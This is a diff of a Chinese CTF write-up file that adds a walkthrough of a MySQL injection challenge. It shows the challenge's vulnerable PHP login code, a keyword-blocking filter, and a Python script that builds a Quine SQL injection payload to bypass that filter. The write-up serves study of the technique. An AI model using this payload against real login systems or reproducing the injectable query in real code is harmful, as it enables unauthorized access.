@@ -1,4 +1,4 @@
-# Mini V&N CTF【chatrobot】复现
+# 0x03 Mini V&N CTF【chatrobot】复现
 给了源码，主要文件有两个：
 1. `target/chatrobot-1.0-SNAPSHOT.jar!\com\ctf\chatrobot\App.class`
 2. `src/app.py`
@@ -289,3 +289,87 @@ LOGGER.info(...)  →  stderr
 System.out.println(...) → stdout
 ```
 所以我们这里打`/`路由
+#  0x02 第五空间 2021【yet_another_mysql_injection】
+
+`?source`拿到源代码：
+```php
+<?php
+include_once("lib.php");
+function alertMes($mes,$url){
+    die("<script>alert('{$mes}');location.href='{$url}';</script>");
+}
+
+function checkSql($s) {
+    if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
+        alertMes('hacker', 'index.php');
+    }
+}
+
+if (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['password']) && $_POST['password'] != '') {
+    $username=$_POST['username'];
+    $password=$_POST['password'];
+    if ($username !== 'admin') {
+        alertMes('only admin can login', 'index.php');
+    }
+    checkSql($password);
+    $sql="SELECT password FROM users WHERE username='admin' and password='$password';";
+    $user_result=mysqli_query($con,$sql);
+    $row = mysqli_fetch_array($user_result);
+    if (!$row) {
+        alertMes("something wrong",'index.php');
+    }
+    if ($row['password'] === $password) {
+        die($FLAG);
+    } else {
+    alertMes("wrong password",'index.php');
+  }
+}
+
+if(isset($_GET['source'])){
+  show_source(__FILE__);
+  die;
+}
+?>
+<!-- /?source -->
+<html>
+    <body>
+        <form action="/index.php" method="post">
+            <input type="text" name="username" placeholder="账号"><br/>
+            <input type="password" name="password" placeholder="密码"><br/>
+            <input type="submit" / value="登录">
+        </form>
+    </body>
+</html>
+```
+就是简单的账号密码，账号为`admin`,密码是从数据库查询的密码
+```sql
+SELECT password FROM users WHERE username='admin' and password='$password';
+```
+会执行这条语句，其中`$password`是我们控制的。
+这里按理来说其实是可以打盲注的。但是这里我们打Quine注入更简单，因为如果让查询结果等于输入，那我们的条件不久永真了吗，
+这里有脚本
+```python
+sql = input ("输入你的sql语句,不用写关键查询的信息  形如 1'union select #\n")
+sql2 = sql.replace("'",'"')
+base = "replace(replace('.',char(34),char(39)),char(46),'.')"
+final = ""
+def add(string):
+    if ("--+" in string):
+        tem = string.split("--+")[0] + base + "--+"
+    if ("#" in string):
+        tem = string.split("#")[0] + base + "#"
+    return tem
+def patch(string,sql):
+    if ("--+" in string):
+        return sql.split("--+")[0] + string + "--+"
+    if ("#" in string):
+        return sql.split("#")[0] + string + "#"
+
+res = patch(base.replace(".",add(sql2)),sql).replace(" ","/**/").replace("'.'",'"."')
+
+print(res)
+```
+![](assets/Quine注入/file-20251217195614491.png)
+就帮我们构造好了（-1后面有个`'`我忘记了）
+![500](assets/Quine注入/file-20251217200038962.png)
+输入就出了
